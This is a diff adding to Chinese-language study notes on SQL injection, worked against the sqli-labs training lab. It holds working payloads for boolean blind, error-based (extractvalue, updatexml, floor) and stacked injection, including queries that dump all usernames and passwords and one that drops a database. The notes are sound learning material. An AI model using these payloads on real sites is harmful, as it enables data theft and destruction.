@@ -283,9 +283,20 @@ SELECT * FROM t1;
 
 Gifts union select 1,2,3,4#
 
+在使用union select database()之前，要先确定有多少列，使用group by(order by)来判断
+
 ### Boolean-Base布尔型注入
 
-永真型注入:a' or **1=1**#
+布尔盲注的前提是页面有真假值
+
+```mysql
+通过ascii()函数,length()函数来进行大小比较从而确定字母
+http://192.168.88.133/sql/Less-7?id=1')) and length((select database()))>7--+
+http://192.168.88.133/sql/Less-7?id=1')) and length((select database()))>8--+
+第一个命令回显是true，而第二个回显false，证明数据库名字长度为8
+http://192.168.88.133/sql/Less-7?id=1')) and ascii(substr((select database()),1,1))>100--+
+与substr()函数配合使用，即可将字母一个一个确认
+```
 
 ### Time-Based基于时间延迟注入
 
@@ -330,7 +341,96 @@ select right('Micheal',3)[^结果是eal]
 
 ### Error-Based报错型注入
 
+#### extractvalue报错注入
+
+```mysql
+http://127.0.0.1/sql/Less-5?id=0' union select 1,extractvalue(1,concat(0x7e,(select database()))),3--+ 
+concat函数是让0x7e和后面的指令连接在一起，0x7e是~的ASCII码，会使MySQL报错，从而爆出后面执行语句的结果。extractvalue的两个参数的第一个可以随便写，如上面写的是1
+```
+
+报错注入的局限性在于最多显示32个字符，可以配合使用substring()函数
+
+```mysql
+http://127.0.0.1/sql/Less-5?id=0' union select 1,extractvalue(1,concat(0x7e,(select substring(group_concat(username,'~',password),25,30) from users))),3--+ 
+substring使其从第25个字符开始往后再显示30个字符，再拼接起来就得到了所有用户名和密码
+```
+
+
+
+#### updataxml报错注入
+
+```mysql
+updatexml函数有三个参数
+updatexml(XML_document[XML文档对象的名称],XPath_string[路径],new_value[替换查找到的符合条件的数据])
+报错原理同extractvalue()，输入错误的第二个参数，即更改路径的符号，第一个参数和第三个参数可以随便填
+http://127.0.0.1/sql/Less-5?id=0' union select 1,updatexml(1,concat(0x7e,(select database())),3),3--+ 
+```
+
+#### floor报错注入
+
+涉及函数：
+
+rand()函数：随机返回0~1之间的小数
+
+floor()函数：小数向下取整数
+
+ceiling()函数：小数向上取整数
+
+concat_ws()函数：将括号内数据用第一个字段连接起来
+
+```mysql
+select concat_ws('~',2,3);
+执行结果是2~3
+```
+
+count()函数：汇总统计数量
+
+```mysql
+select concat_ws('~',(select database()),floor(rand()*2)) from users;
+有多少用户就计算多少次，且结果随机
+```
+
+```mysql
+select count(*),concat_ws('~',(select database()),floor(rand()*2)) as a from users group by a;
+as别名，group by分组，count()汇总统计数量
+rand()偶尔会出现报错，rand(0)固定报错，rand(1)不报错，原因：
+当我们将count(*)去掉便不再报错，说明是在统计时出现错误
+rand()函数进行分组group by和统计count()时可能会多次执行，导致键值key重复(不是很懂)
+```
+
+```sql
+http://127.0.0.1/sql/Less-5/?id=1' union select 1,count(*),concat_ws('-',(select group_concat(table_name) from information_schema.tables where table_schema=database()),floor(rand(0)*2)) as x from information_schema.tables group by x--+
+完整注入，爆表
+```
+
 ### 堆叠注入
 
 a'**;**drop database databasename;
+
+## 学习sqli-labs靶场
+
+### 如何判断是字符型注入还是数字型注入
+
+使用and 1=1和and 1=2来判断
+
+如果是字符型，就算是and 1=2，页面依旧正常显示，而数字型的话页面不会正常显示
+
+在Less-1中提交and 1=1和提交and 1=2都能正常显示页面，则为字符型注入
+
+在Less=2中提交and 1=2时，网页无法正常显示，判断为数字型注入
+
+还有一种方法就是?id=2-1，如果是数字型，那么显示的页面就是?id=1，如果是字符型，显示的页面就是?id=2
+
+```sql
+字符型：
+$sql="SELECT * FROM USERS WHERE id='$id' LIMIT 0,1";
+提交 1 and 1=1:
+$sql="SELECT * FROM users WHERE id='1 and 1=1' LIMIT 0,1";
+单引号闭合语句后Where语句为一个条件id=' 1 and 1=1'
+数字型：
+$sql="SELECT * FROM users WHERE id=$id LIMIT 0,1";
+提交 and 1=2
+$sql="SELECT * FROM users WHERE id=$id and 1=2 LIMIT 0,1";
+数字型不需要闭合
+```
 
